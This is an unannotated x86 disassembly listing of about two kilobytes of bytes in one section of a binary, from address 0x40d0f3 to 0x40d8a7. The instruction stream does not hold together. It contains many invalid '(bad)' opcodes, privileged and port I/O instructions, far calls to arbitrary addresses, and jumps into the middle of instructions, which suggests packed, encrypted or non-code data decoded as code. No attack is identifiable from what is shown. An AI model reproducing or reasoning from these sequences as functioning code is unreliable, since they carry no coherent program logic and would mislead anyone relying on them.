  40d0f3:	imul   ebx,DWORD PTR [esi+0x2979c691],0xffffffa3
  40d0fa:	inc    eax
  40d0fb:	adc    eax,DWORD PTR [edx-0x19b0e0b6]
  40d101:	ret    0x8da6
  40d104:	mov    bh,0x5e
  40d106:	add    esi,edi
  40d108:	shr    DWORD PTR [eax+0x78],cl
  40d10b:	in     al,dx
  40d10c:	aam    0x7c
  40d10e:	xchg   esi,eax
  40d10f:	push   ecx
  40d110:	push   0x6a
  40d112:	adc    DWORD PTR [eax-0xf],ecx
  40d115:	pop    ebp
  40d116:	xor    al,0xf8
  40d118:	adc    al,0x83
  40d11a:	sub    cl,al
  40d11c:	jo     0x40d0b9
  40d11e:	inc    ebp
  40d11f:	mov    ecx,0x215472c5
  40d124:	arpl   WORD PTR [ebp-0x6564ddf5],bx
  40d12a:	sbb    al,0x11
  40d12c:	jnp    0x40d14f
  40d12e:	mov    edi,0xdda3a569
  40d133:	adc    ebp,ebx
  40d135:	adc    ecx,DWORD PTR [esi+0x6901950a]
  40d13b:	shl    DWORD PTR [esi+0x3e],0xf0
  40d13f:	or     al,BYTE PTR ds:0x3f7e831
  40d145:	pop    es
  40d146:	enter  0xe46e,0x31
  40d14a:	(bad)  
  40d14b:	repnz mov cl,0x9
  40d14e:	cmp    edi,ebp
  40d150:	sub    al,0x1a
  40d152:	push   ebp
  40d153:	pop    ebx
  40d154:	cmc    
  40d155:	cdq    
  40d156:	cs mov edx,0xbd7394b6
  40d15c:	mov    dh,BYTE PTR [ebp+0x53ca7323]
  40d162:	fcmove st,st(6)
  40d164:	cld    
  40d165:	js     0x40d167
  40d167:	ins    BYTE PTR es:[edi],dx
  40d168:	mov    bl,0x45
  40d16a:	popf   
  40d16b:	fldenv [edx-0x1fff3ed]
  40d171:	xchg   ebp,eax
  40d172:	mov    ebp,0x1007550d
  40d177:	mov    ecx,0x3b290455
  40d17c:	shl    DWORD PTR [ebp-0x6c],1
  40d17f:	ror    DWORD PTR [eax],0xd0
  40d182:	sahf   
  40d183:	and    BYTE PTR [esi-0x27],0xf0
  40d187:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d188:	xchg   ebx,eax
  40d189:	push   es
  40d18a:	push   es
  40d18b:	adc    eax,0x38ecd349
  40d190:	pop    es
  40d191:	dec    edx
  40d192:	add    edi,DWORD PTR [esi]
  40d194:	jno    0x40d137
  40d196:	imul   ebx,DWORD PTR [ebp+0x4ff30093],0x5a54f708
  40d1a0:	lahf   
  40d1a1:	jb     0x40d1c7
  40d1a3:	leave  
  40d1a4:	div    DWORD PTR [edi-0x29335ff8]
  40d1aa:	nop
  40d1ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1ac:	xor    dh,cl
  40d1ae:	call   0x51f7a40f
  40d1b3:	aad    0xb
  40d1b5:	cmp    eax,0x97fb5186
  40d1ba:	fidivr DWORD PTR [esi+0x2d691119]
  40d1c0:	mov    esi,0xd343d910
  40d1c5:	out    dx,al
  40d1c6:	jge    0x40d1bd
  40d1c8:	jb     0x40d23b
  40d1ca:	pusha  
  40d1cb:	mov    ebx,0x3e86a27e
  40d1d0:	inc    edx
  40d1d1:	inc    esp
  40d1d2:	sub    eax,0x8e714605
  40d1d7:	mov    al,0xcf
  40d1d9:	fwait
  40d1da:	sub    esi,DWORD PTR [edi]
  40d1dc:	and    dl,dh
  40d1de:	nop
  40d1df:	sub    DWORD PTR [ecx],0xffffffd3
  40d1e2:	push   ecx
  40d1e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d1e4:	mov    edx,0x52d08e7b
  40d1e9:	in     al,0xce
  40d1eb:	inc    edx
  40d1ec:	dec    ebp
  40d1ed:	add    eax,0x85d42e9c
  40d1f2:	push   ds
  40d1f3:	out    dx,al
  40d1f4:	sub    al,0x7d
  40d1f6:	push   ecx
  40d1f7:	xchg   esi,eax
  40d1f8:	sbb    ah,dl
  40d1fa:	movntq QWORD PTR [eax+0x69],mm5
  40d1fe:	fstp   TBYTE PTR [eax]
  40d200:	bound  ecx,QWORD PTR [edi]
  40d202:	mov    DWORD PTR [edi],ebx
  40d204:	or     al,0x51
  40d206:	pop    ds
  40d207:	fwait
  40d208:	mov    eax,eax
  40d20a:	inc    ebx
  40d20b:	mov    esi,0x3b08e574
  40d210:	(bad)  [eax-0x25b1353f]
  40d216:	xlat   BYTE PTR ds:[ebx]
  40d217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d218:	push   ebx
  40d219:	dec    ebp
  40d21a:	daa    
  40d21b:	and    edi,DWORD PTR [ecx-0x57]
  40d21e:	mov    fs,WORD PTR [ebp*2-0x3b4ce26c]
  40d225:	test   al,0x91
  40d227:	call   0xc53354e0
  40d22c:	adc    ecx,ebx
  40d22e:	loopne 0x40d293
  40d230:	fcom   QWORD PTR [edi]
  40d232:	cmp    DWORD PTR [ecx],esp
  40d234:	sub    DWORD PTR [edx+esi*2+0x55],eax
  40d238:	dec    ebx
  40d239:	mov    ebx,0x93763a0f
  40d23e:	imul   ebp,DWORD PTR [ebp+0x8eba0e6],0xf1439f6e
  40d248:	jmp    0xa92d07d0
  40d24d:	icebp  
  40d24e:	jae    0x40d287
  40d250:	push   ecx
  40d251:	rcl    DWORD PTR ds:0x8ead01a5,cl
  40d257:	xchg   BYTE PTR [ebx+0x46ef8a31],bh
  40d25d:	or     DWORD PTR [ebx-0x73],ebx
  40d260:	push   eax
  40d261:	and    BYTE PTR [ebp+0x46a14784],bl
  40d267:	cdq    
  40d268:	push   ecx
  40d269:	sti    
  40d26a:	repnz add dh,BYTE PTR [edi-0x69b1be96]
  40d271:	adc    bh,BYTE PTR [edi+0x51e8df62]
  40d277:	(bad)  
  40d278:	xor    eax,0x98b410a4
  40d27d:	or     al,0xd5
  40d27f:	stos   DWORD PTR es:[edi],eax
  40d280:	push   cs
  40d281:	inc    ebx
  40d282:	test   BYTE PTR [edi],dh
  40d284:	xchg   DWORD PTR [edi],ebp
  40d286:	inc    ebx
  40d287:	mov    ds:0xf2cf560b,eax
  40d28c:	arpl   WORD PTR [esi+edx*2+0x69],ax
  40d290:	and    edi,DWORD PTR [ebp+eax*4-0x3f1716cb]
  40d297:	aad    0x36
  40d299:	add    DWORD PTR [ebp-0x59],edi
  40d29c:	std    
  40d29d:	ss dec eax
  40d29f:	sbb    DWORD PTR [ebx],edx
  40d2a1:	add    ebx,DWORD PTR [eax-0x3067787d]
  40d2a7:	ins    DWORD PTR es:[edi],dx
  40d2a8:	rcr    BYTE PTR [edx-0x465858f2],1
  40d2ae:	scas   eax,DWORD PTR es:[edi]
  40d2af:	xchg   BYTE PTR gs:[ebx],ah
  40d2b2:	mov    eax,0xfc25c49e
  40d2b7:	mov    bl,0x8d
  40d2b9:	xor    bh,BYTE PTR [edx+ebx*4-0x19]
  40d2bd:	int    0x4
  40d2bf:	or     BYTE PTR [eax-0x7e],dl
  40d2c2:	nop
  40d2c3:	neg    DWORD PTR [edi-0x35c52416]
  40d2c9:	mov    bl,0xd
  40d2cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d2cc:	fimul  DWORD PTR [edx+0x7c]
  40d2cf:	cmp    al,BYTE PTR [ebx+0x5f57da16]
  40d2d5:	das    
  40d2d6:	addr16 mov cl,0xf8
  40d2d9:	xor    eax,0x3f599086
  40d2de:	gs mov dh,0x92
  40d2e1:	push   edi
  40d2e2:	adc    ch,BYTE PTR [edx]
  40d2e4:	ds call 0x37c4:0xb665eac1
  40d2ec:	fstp   st(5)
  40d2ee:	fstp   DWORD PTR [ebx+0x13d1458c]
  40d2f4:	adc    ebx,DWORD PTR [ecx+0x533ac56f]
  40d2fa:	sub    esi,DWORD PTR [eax+0x59]
  40d2fd:	push   ss
  40d2fe:	enter  0xb5d8,0x1a
  40d302:	mov    esi,ss
  40d304:	fdivr  QWORD PTR [esi]
  40d306:	or     bh,dh
  40d308:	jg     0x40d2dd
  40d30a:	xor    al,0x1b
  40d30c:	sub    DWORD PTR [edx],0xaf192f0a
  40d312:	dec    esi
  40d313:	adc    BYTE PTR [eax],al
  40d315:	sti    
  40d316:	cmp    DWORD PTR [eax],esi
  40d318:	ja     0x40d32d
  40d31a:	ror    BYTE PTR [edx+0x55],1
  40d31d:	xor    dl,BYTE PTR [edi]
  40d31f:	xor    eax,0x6411d87e
  40d324:	pop    edx
  40d325:	push   edx
  40d326:	rsm    
  40d328:	cmp    eax,0x1d10369d
  40d32d:	imul   edx,DWORD PTR [edi-0x1db740d8],0xf8d6ba4
  40d337:	or     esp,DWORD PTR [edi]
  40d339:	adc    bh,BYTE PTR [ecx]
  40d33b:	shl    BYTE PTR [edi+0x54831891],0x62
  40d342:	loopne 0x40d2c8
  40d344:	inc    edi
  40d345:	or     al,0x99
  40d347:	clc    
  40d348:	cmc    
  40d349:	fdivr  st(6),st
  40d34b:	call   FWORD PTR [esp+eax*2]
  40d34e:	adc    DWORD PTR [esi-0x4e],esp
  40d351:	mov    ?,WORD PTR [ebp+0x143206c9]
  40d357:	push   ebx
  40d358:	mov    WORD PTR [ebp+0xbe25edb],ss
  40d35e:	xchg   edx,eax
  40d35f:	out    0x79,eax
  40d361:	out    0x2e,al
  40d363:	mov    eax,ds:0x4cb8c2e7
  40d368:	addr16 xchg ebx,eax
  40d36a:	hlt    
  40d36b:	out    dx,eax
  40d36c:	clc    
  40d36d:	outs   dx,BYTE PTR ds:[esi]
  40d36e:	mov    bh,0x85
  40d370:	mov    edx,0xf21aca7e
  40d375:	xchg   esp,eax
  40d376:	jno    0x40d37b
  40d378:	sbb    esp,DWORD PTR es:[edx-0x3f]
  40d37c:	push   esp
  40d37d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d37e:	fstp   QWORD PTR [ebx+0x45]
  40d381:	retf   
  40d382:	es push esi
  40d384:	ret    0xd562
  40d387:	test   DWORD PTR [ecx],esi
  40d389:	push   esi
  40d38a:	fsubr  QWORD PTR [ebx+0x5d]
  40d38d:	add    dh,BYTE PTR [edx]
  40d38f:	mov    dh,0x18
  40d391:	mov    esp,DWORD PTR [edi+0x228dd4fa]
  40d397:	lods   al,BYTE PTR ds:[esi]
  40d398:	enter  0xd3f6,0x4e
  40d39c:	mov    bl,0xb6
  40d39e:	sbb    eax,0xe62201b1
  40d3a3:	mov    esi,0x4194773f
  40d3a8:	aad    0xb1
  40d3aa:	call   0x2fe52098
  40d3af:	out    0x46,eax
  40d3b1:	loopne 0x40d3d7
  40d3b3:	imul   ebx,ebx,0xffffffdb
  40d3b6:	push   cs
  40d3b7:	xor    dh,BYTE PTR [ecx+0x1]
  40d3ba:	pop    edi
  40d3bb:	mov    cl,BYTE PTR [edx+0x5]
  40d3be:	aas    
  40d3bf:	and    dl,BYTE PTR [eax]
  40d3c1:	pop    ebx
  40d3c2:	adc    al,0x3a
  40d3c4:	dec    ebx
  40d3c5:	sbb    DWORD PTR [edi],0x889ddfdc
  40d3cb:	popa   
  40d3cc:	aam    0x93
  40d3ce:	mov    BYTE PTR [esi],cl
  40d3d0:	pop    esp
  40d3d1:	xchg   esp,eax
  40d3d2:	jae    0x40d3e1
  40d3d4:	xchg   ebp,eax
  40d3d5:	and    dl,bh
  40d3d7:	jg     0x40d398
  40d3d9:	push   ebx
  40d3da:	call   0x6c1a:0xce7c2682
  40d3e1:	(bad)  
  40d3e2:	dec    edi
  40d3e3:	mov    dl,0xe6
  40d3e5:	loope  0x40d387
  40d3e7:	test   bl,0x7
  40d3ea:	mov    eax,0xabd012e1
  40d3ef:	bnd jnp 0x40d372
  40d3f2:	loope  0x40d3e6
  40d3f4:	mov    ds,WORD PTR [ebp-0x68a29a91]
  40d3fa:	push   edx
  40d3fb:	mov    ds:0x426a1e12,al
  40d400:	push   edi
  40d401:	fsubr  QWORD PTR [esi-0x77f038c5]
  40d407:	cdq    
  40d408:	(bad)  
  40d409:	fld    DWORD PTR [edi+0x74]
  40d40c:	enter  0x314f,0xb8
  40d410:	dec    ebp
  40d411:	lea    ebx,[ebp+0x72]
  40d414:	mov    esi,0x23ffcf04
  40d419:	dec    BYTE PTR [ebx]
  40d41b:	out    0x2b,eax
  40d41d:	mov    ebx,0x80ca4c2d
  40d422:	dec    ebx
  40d423:	add    DWORD PTR [ecx+0x3812be8c],ecx
  40d429:	into   
  40d42a:	mov    edx,0x59e200d6
  40d42f:	lds    ecx,FWORD PTR ds:0x18f6bea3
  40d435:	fisubr WORD PTR [ecx]
  40d437:	out    0x5f,eax
  40d439:	jmp    0x40d4a9
  40d43b:	push   0xa532354e
  40d440:	push   ss
  40d441:	ins    DWORD PTR es:[edi],dx
  40d442:	aas    
  40d443:	xor    BYTE PTR ds:0xa0f823d3,ah
  40d449:	sub    cl,al
  40d44b:	les    edi,FWORD PTR [edx+0x5161df1d]
  40d451:	xchg   edi,eax
  40d452:	aaa    
  40d453:	xchg   ebp,eax
  40d454:	push   ebx
  40d455:	xchg   esi,eax
  40d456:	mov    bh,0x6b
  40d458:	xor    eax,0x939210ed
  40d45d:	sub    eax,0xce021687
  40d462:	xor    ch,BYTE PTR [ecx-0x41]
  40d465:	aam    0xd4
  40d467:	cwde   
  40d468:	xchg   ebp,eax
  40d469:	retf   
  40d46a:	popf   
  40d46b:	ins    BYTE PTR es:[edi],dx
  40d46c:	(bad)  [ebp+0x4ed9c3c9]
  40d472:	gs inc ecx
  40d474:	or     al,0xe
  40d476:	call   0x97ff:0x7ba52634
  40d47d:	pop    ebp
  40d47e:	mov    ds:0x7dfc4ab9,eax
  40d483:	xchg   ebx,eax
  40d484:	test   DWORD PTR [ebx-0x18],0xc7dbbdb1
  40d48b:	dec    ebp
  40d48c:	call   0xe9b8:0xf150bbdf
  40d493:	cdq    
  40d494:	mov    ds:0x689d585b,al
  40d499:	mov    eax,0x1aaacc65
  40d49e:	imul   edi,DWORD PTR [ebp+0x1b],0xb894cbf
  40d4a5:	fiadd  DWORD PTR ds:[edx+0x3e]
  40d4a9:	or     edx,edi
  40d4ab:	aad    0xd4
  40d4ad:	mov    al,BYTE PTR [edx+0x77]
  40d4b0:	dec    ebx
  40d4b1:	pop    ds
  40d4b2:	mov    ds:0xf038e5ee,al
  40d4b7:	and    DWORD PTR ds:0xa712ead7,0x778fcbc9
  40d4c1:	adc    bl,ah
  40d4c3:	mov    BYTE PTR [ebx],0xda
  40d4c6:	mov    ch,0xa
  40d4c8:	mov    al,ds:0xc678ca69
  40d4cd:	mov    ebp,DWORD PTR [eax+0x2b607068]
  40d4d3:	xchg   ebp,eax
  40d4d4:	mov    ebp,0xf5442ac3
  40d4da:	xor    bl,bl
  40d4dc:	dec    ecx
  40d4dd:	dec    ebp
  40d4de:	ja     0x40d4c0
  40d4e0:	add    BYTE PTR [ebx-0x4e],0xe3
  40d4e4:	and    eax,0x90d146b8
  40d4e9:	cli    
  40d4ea:	fld    QWORD PTR [eax-0x63835fdb]
  40d4f0:	out    dx,al
  40d4f1:	xchg   esi,eax
  40d4f2:	jp     0x40d480
  40d4f4:	jno    0x40d558
  40d4f6:	js     0x40d48a
  40d4f8:	iret   
  40d4f9:	cmc    
  40d4fa:	jecxz  0x40d500
  40d4fc:	cmp    DWORD PTR ds:0x1c95b230,ecx
  40d502:	das    
  40d503:	mov    ecx,esp
  40d505:	push   ds
  40d506:	jnp    0x40d55c
  40d508:	iret   
  40d509:	addr16 call 0x8254:0xd0712689
  40d511:	push   eax
  40d512:	inc    ebx
  40d513:	jmp    0x40d4fc
  40d515:	xchg   ecx,eax
  40d516:	popa   
  40d517:	imul   DWORD PTR [edi]
  40d519:	int3   
  40d51a:	in     al,0xa3
  40d51c:	(bad)  
  40d51d:	sub    eax,DWORD PTR [eax]
  40d51f:	push   cs
  40d520:	add    DWORD PTR [ebx+ebp*8],ebp
  40d523:	mov    dl,0x96
  40d525:	pop    ecx
  40d526:	xchg   ecx,eax
  40d527:	fdiv   DWORD PTR [esi-0x11]
  40d52a:	into   
  40d52b:	push   es
  40d52c:	push   ds
  40d52d:	ja     0x40d56c
  40d52f:	test   BYTE PTR [esp+eiz*8-0x30],cl
  40d533:	shl    eax,cl
  40d535:	sbb    eax,0xc3c80a4d
  40d53a:	add    eax,0x132aad79
  40d53f:	call   0xdbd21249
  40d544:	popf   
  40d545:	cmp    dh,BYTE PTR [eax]
  40d547:	ret    
  40d548:	das    
  40d549:	sti    
  40d54a:	xor    ebp,DWORD PTR [esp+esi*8+0x5efed679]
  40d551:	sub    ebx,DWORD PTR [edx]
  40d553:	popf   
  40d554:	mov    ds:0x2f4cea56,al
  40d559:	cmp    edi,DWORD PTR [eax]
  40d55b:	mov    ebp,0xd895186f
  40d560:	rol    DWORD PTR [ebx],1
  40d562:	in     eax,0xaa
  40d564:	in     eax,0xe8
  40d566:	or     DWORD PTR [ecx+0x684b04ec],ebx
  40d56c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d56d:	jo     0x40d541
  40d56f:	push   0xde2a4373
  40d574:	sbb    al,0x9
  40d576:	lock cs cdq 
  40d579:	stos   DWORD PTR es:[edi],eax
  40d57a:	cmp    BYTE PTR [ecx+edi*8-0x3f],dl
  40d57e:	xchg   ecx,eax
  40d57f:	sbb    cl,BYTE PTR [ebx-0x43]
  40d582:	cdq    
  40d583:	jecxz  0x40d593
  40d585:	arpl   WORD PTR [ebp+0x3],bp
  40d588:	call   0xd51a:0xbb90dd1b
  40d58f:	cs xchg edi,edx
  40d592:	sub    al,BYTE PTR [esi+ebp*1+0x344a4b56]
  40d599:	xor    BYTE PTR [ebx+0x63],0xe9
  40d59d:	adc    eax,0xaf3bcf67
  40d5a2:	mov    ebx,0x5fbe570e
  40d5a7:	pop    edx
  40d5a8:	pusha  
  40d5a9:	add    BYTE PTR [edx+0x45],bl
  40d5ac:	and    al,0xff
  40d5ae:	(bad)  
  40d5af:	jecxz  0x40d593
  40d5b1:	xor    al,0x70
  40d5b3:	cmp    edi,esi
  40d5b5:	(bad)  
  40d5b6:	cmp    ch,cl
  40d5b8:	jne    0x40d5bc
  40d5ba:	cmp    cl,BYTE PTR [edi+0x98ea4a]
  40d5c0:	push   esp
  40d5c1:	fdiv   QWORD PTR [eax+0x27]
  40d5c4:	stos   BYTE PTR es:[edi],al
  40d5c5:	imul   esi,edi,0x183d6c17
  40d5cb:	retf   
  40d5cc:	xchg   edx,ebx
  40d5ce:	je     0x40d61d
  40d5d0:	js     0x40d593
  40d5d2:	mov    dh,0xa
  40d5d4:	call   0xcc8ff67e
  40d5d9:	jbe    0x40d601
  40d5db:	inc    edx
  40d5dc:	inc    esi
  40d5dd:	icebp  
  40d5de:	dec    edx
  40d5df:	jl     0x40d5f1
  40d5e1:	pop    edi
  40d5e2:	aas    
  40d5e3:	jno    0x40d656
  40d5e5:	lods   al,BYTE PTR ds:[esi]
  40d5e6:	fdiv   st(7),st
  40d5e8:	jecxz  0x40d655
  40d5ea:	inc    ebx
  40d5eb:	add    bl,ah
  40d5ed:	dec    esp
  40d5ee:	imul   DWORD PTR [esi]
  40d5f0:	inc    ebx
  40d5f1:	xchg   edi,eax
  40d5f2:	call   DWORD PTR [esi+0xd24f1f1]
  40d5f8:	imul   ebp,DWORD PTR [ecx+0x54],0xcc27608c
  40d5ff:	or     BYTE PTR [ebp-0x6d],ah
  40d602:	mov    eax,0xb621a390
  40d607:	add    eax,0x8f3f1dfa
  40d60c:	das    
  40d60d:	dec    esp
  40d60e:	jmp    0x40d64b
  40d610:	fadd   DWORD PTR ds:0x4aafb9ae
  40d616:	out    0x15,al
  40d618:	enter  0x801c,0xe6
  40d61c:	cld    
  40d61d:	push   ebx
  40d61e:	popa   
  40d61f:	add    DWORD PTR ds:0xd2395ea3,ecx
  40d625:	sbb    esp,DWORD PTR [ebx]
  40d627:	mov    al,ds:0x76d5e031
  40d62c:	test   BYTE PTR [edx],bl
  40d62e:	ds ds pop esi
  40d631:	sub    eax,0xe0b642c9
  40d636:	push   es
  40d637:	xor    bh,ah
  40d639:	mov    al,ds:0xb5fcd21b
  40d63e:	pop    ecx
  40d63f:	mov    ds:0xe05abf5d,eax
  40d644:	mov    es,WORD PTR [ebx-0x5b]
  40d647:	jl     0x40d613
  40d649:	dec    esi
  40d64a:	xor    eax,eax
  40d64c:	ins    BYTE PTR es:[edi],dx
  40d64d:	imul   esi,DWORD PTR [edi+0xe],0xffffffe8
  40d651:	adc    DWORD PTR [esi],edi
  40d653:	jbe    0x40d68a
  40d655:	adc    al,0x1b
  40d657:	push   ebx
  40d658:	pop    ds
  40d659:	ins    BYTE PTR es:[edi],dx
  40d65a:	ss mov eax,0xea1b4144
  40d660:	jmp    0x8addf53
  40d665:	xchg   esi,eax
  40d666:	mov    eax,ds:0x5efd203a
  40d66b:	bound  eax,QWORD PTR [edi+0x3c1bb16b]
  40d671:	lds    edi,FWORD PTR [ebx]
  40d673:	rol    BYTE PTR ds:0x91f1e82d,1
  40d679:	mov    bl,0xee
  40d67b:	in     al,0x1d
  40d67d:	shl    ah,0xd1
  40d680:	shr    BYTE PTR [edx-0x72],cl
  40d683:	pop    esp
  40d684:	sbb    dl,BYTE PTR [edi+0x72b4d7c0]
  40d68a:	aas    
  40d68b:	dec    ebx
  40d68c:	cli    
  40d68d:	jl     0x40d65b
  40d68f:	mov    cl,0x14
  40d691:	push   ds
  40d692:	pop    edi
  40d693:	mov    dh,BYTE PTR [ecx-0x5c]
  40d696:	packuswb mm6,QWORD PTR [ecx]
  40d699:	arpl   WORD PTR [edi+edi*8+0x1687eba5],sp
  40d6a0:	and    ebp,DWORD PTR [eax+eax*8-0x3c00c699]
  40d6a7:	fdiv   DWORD PTR [eax+0xb]
  40d6aa:	push   cs
  40d6ab:	mul    edx
  40d6ad:	scas   eax,DWORD PTR es:[edi]
  40d6ae:	scas   eax,DWORD PTR es:[edi]
  40d6af:	aad    0x82
  40d6b1:	dec    ebp
  40d6b2:	fucomp st(1)
  40d6b4:	inc    edx
  40d6b5:	push   ecx
  40d6b6:	ret    0xe321
  40d6b9:	push   ss
  40d6ba:	sti    
  40d6bb:	ins    BYTE PTR es:[edi],dx
  40d6bc:	dec    eax
  40d6bd:	sti    
  40d6be:	ja     0x40d69e
  40d6c0:	iret   
  40d6c1:	cli    
  40d6c2:	enter  0xb2c3,0xd5
  40d6c6:	call   0xe55d:0xe2d1a3df
  40d6cd:	lods   al,BYTE PTR ds:[esi]
  40d6ce:	jnp    0x40d708
  40d6d0:	push   ebp
  40d6d1:	test   al,al
  40d6d3:	jo     0x40d686
  40d6d5:	cs retf 
  40d6d7:	leave  
  40d6d8:	mov    cl,0x8f
  40d6da:	sar    dh,cl
  40d6dc:	ja     0x40d6f2
  40d6de:	cmp    BYTE PTR [ecx-0x7a667b2f],dh
  40d6e4:	mov    ch,BYTE PTR [ebp+0x1d]
  40d6e7:	stos   BYTE PTR es:[edi],al
  40d6e8:	stc    
  40d6e9:	in     eax,0x4a
  40d6eb:	mov    ebp,0x414f4f64
  40d6f0:	fs and dl,al
  40d6f3:	imul   eax,esi,0x70bdffb3
  40d6f9:	rcl    DWORD PTR [eax-0x78],0xbc
  40d6fd:	(bad)  
  40d6ff:	mov    ch,0xe4
  40d701:	mov    ds:0xe77884cc,al
  40d706:	dec    esp
  40d707:	adc    BYTE PTR [esi+0x41],bl
  40d70a:	xor    ebx,DWORD PTR [edi+0x16add56e]
  40d710:	lds    edx,FWORD PTR [edi+0x41]
  40d713:	cwde   
  40d714:	sbb    ebx,ecx
  40d716:	leave  
  40d717:	retf   
  40d718:	cmp    DWORD PTR ds:0x659f3f26,esi
  40d71e:	fisttp WORD PTR [eax-0x2d]
  40d721:	lods   eax,DWORD PTR ds:[esi]
  40d722:	xor    eax,DWORD PTR [eax-0x54f25a36]
  40d728:	mov    dl,0x5
  40d72a:	repz test esi,esp
  40d72d:	rol    ah,1
  40d72f:	in     al,0x62
  40d731:	scas   al,BYTE PTR es:[edi]
  40d732:	lods   eax,DWORD PTR ds:[esi]
  40d733:	lea    eax,[edi-0xf178a77]
  40d739:	jo     0x40d6e1
  40d73b:	cmp    bl,BYTE PTR [edx-0x484602cd]
  40d741:	sub    eax,0x2d7cf349
  40d746:	sahf   
  40d747:	xor    eax,0x9fabe9bf
  40d74c:	(bad)  
  40d74d:	cmp    DWORD PTR [edx-0x24d58f87],eax
  40d753:	icebp  
  40d754:	dec    edx
  40d755:	out    0x9d,al
  40d757:	sub    ch,dl
  40d759:	push   eax
  40d75a:	addr16 (bad) 
  40d75c:	dec    esp
  40d75d:	shr    BYTE PTR [ebx+ebp*8-0x5eb04dd3],cl
  40d764:	clc    
  40d765:	mov    cl,0x3a
  40d767:	jle    0x40d726
  40d769:	sbb    eax,0x6a3091fd
  40d76e:	mov    edx,0x333e186f
  40d773:	loope  0x40d7e5
  40d775:	shl    DWORD PTR [edx],0xa4
  40d778:	xor    eax,0x9b545711
  40d77d:	and    ecx,esi
  40d77f:	sti    
  40d780:	test   BYTE PTR [edi+0x6fdbf090],bl
  40d786:	or     al,0x39
  40d788:	popf   
  40d789:	cmc    
  40d78a:	add    eax,esi
  40d78c:	xchg   esp,eax
  40d78e:	xor    ah,BYTE PTR [esi+ecx*2-0x42]
  40d792:	or     DWORD PTR [esi-0x49],0x39
  40d796:	mov    ah,0xf7
  40d798:	scas   eax,DWORD PTR es:[edi]
  40d799:	int    0x2d
  40d79b:	sub    DWORD PTR [eax+esi*8],0xffffffd5
  40d79f:	and    ebp,esp
  40d7a1:	js     0x40d7d1
  40d7a3:	or     al,0x34
  40d7a5:	push   edi
  40d7a6:	dec    edx
  40d7a7:	test   eax,0x450e978a
  40d7ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d7ad:	addr16 mov ds:0xc249,eax
  40d7b1:	in     al,0xda
  40d7b3:	loop   0x40d791
  40d7b5:	adc    al,0x63
  40d7b7:	fcomp  DWORD PTR [ebx+0x4870d0ea]
  40d7bd:	lock fwait
  40d7bf:	jmp    0x761e594c
  40d7c4:	sbb    al,0xe3
  40d7c6:	xchg   ecx,eax
  40d7c7:	(bad)  
  40d7c9:	add    BYTE PTR [edi+eax*2-0x5e],cl
  40d7cd:	popa   
  40d7ce:	(bad)  
  40d7cf:	int3   
  40d7d0:	or     al,0x77
  40d7d2:	cmp    al,0x65
  40d7d4:	sbb    eax,0xe8ef8b05
  40d7d9:	sbb    eax,0x57c634ad
  40d7de:	mov    bl,0x8
  40d7e0:	inc    esi
  40d7e1:	push   edx
  40d7e2:	cmp    esi,ecx
  40d7e4:	push   esp
  40d7e5:	jnp    0x40d81b
  40d7e7:	test   al,0x21
  40d7e9:	std    
  40d7ea:	inc    esi
  40d7eb:	not    DWORD PTR [ebx+edx*4]
  40d7ee:	je     0x40d7fc
  40d7f0:	fbstp  TBYTE PTR [eax-0x85bfdab]
  40d7f6:	jns    0x40d820
  40d7f8:	retf   0xb90e
  40d7fb:	dec    esi
  40d7fc:	daa    
  40d7fd:	ss enter 0x7574,0x2b
  40d802:	bound  esp,QWORD PTR [eax+0x624a9f04]
  40d808:	pop    ecx
  40d809:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d80a:	out    dx,al
  40d80b:	out    dx,eax
  40d80c:	fistp  QWORD PTR [ebp+0x2632e386]
  40d812:	ret    
  40d813:	ds cs xchg edx,eax
  40d816:	aad    0x80
  40d818:	scas   eax,DWORD PTR es:[edi]
  40d819:	cmp    al,0x96
  40d81b:	sbb    al,0x37
  40d81d:	pop    ds
  40d81e:	retf   
  40d81f:	dec    eax
  40d820:	dec    ebp
  40d821:	xor    DWORD PTR [edx+0x79],edx
  40d824:	addr16 xor al,0x97
  40d827:	mov    al,0x8c
  40d829:	ret    0x8703
  40d82c:	pusha  
  40d82d:	adc    eax,ebx
  40d82f:	test   DWORD PTR [edx],esi
  40d831:	paddw  mm1,QWORD PTR [esi+0x31]
  40d835:	jno    0x40d881
  40d837:	loopne 0x40d8b0
  40d839:	mov    esi,0xc829508c
  40d83e:	pop    es
  40d83f:	mov    esi,DWORD PTR [eax]
  40d841:	and    eax,0x761ce8b
  40d846:	repnz dec edx
  40d848:	inc    ebp
  40d849:	aaa    
  40d84a:	mov    bl,0x97
  40d84c:	cs loope 0x40d7d5
  40d84f:	xor    DWORD PTR [ecx],ebx
  40d851:	adc    BYTE PTR [edx+0x5a],dl
  40d854:	mov    edi,0x665fe61c
  40d859:	int    0xdc
  40d85b:	(bad)  
  40d85c:	sbb    DWORD PTR [ebx+0x77],ecx
  40d85f:	cld    
  40d860:	xchg   ecx,eax
  40d861:	jb     0x40d8db
  40d863:	int3   
  40d864:	pop    ds
  40d865:	mov    dl,0x4b
  40d867:	fs add esp,edi
  40d86a:	sub    BYTE PTR [edx],dh
  40d86c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d86d:	int    0xf3
  40d86f:	pop    eax
  40d870:	sub    eax,0xce8fb670
  40d875:	jns    0x40d7f8
  40d877:	mov    cl,0xa1
  40d879:	loope  0x40d8a0
  40d87b:	xchg   edi,eax
  40d87c:	outs   dx,BYTE PTR ds:[esi]
  40d87d:	iret   
  40d87e:	inc    eax
  40d87f:	daa    
  40d880:	and    ch,dl
  40d882:	cmp    al,0xbc
  40d884:	push   0x13
  40d886:	jae    0x40d889
  40d888:	add    eax,0x86500315
  40d88d:	and    ecx,DWORD PTR [esi-0x6d]
  40d890:	fild   WORD PTR [ecx+0x6f679bd5]
  40d896:	xchg   esp,eax
  40d897:	push   ecx
  40d898:	mov    BYTE PTR [edi-0x707617ba],cl
  40d89e:	lea    ebp,[ebx-0x733d6494]
  40d8a4:	test   BYTE PTR [ebx+0x5f],ch
  40d8a7:	push   ss
